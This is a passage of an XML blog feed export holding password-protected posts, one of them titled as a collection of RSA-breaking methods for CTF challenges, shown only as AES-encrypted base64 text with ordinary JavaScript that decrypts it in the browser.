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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
showMessage("嘻嘻嘻，密码不对哦~", 5000);};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF-RSA破解方式整理]]></title>
      <url>/2018/07/09/rsa-ctf/</url>
      <content type="html"><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
		showMessage('嘿！芝麻开门~~', 5000);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">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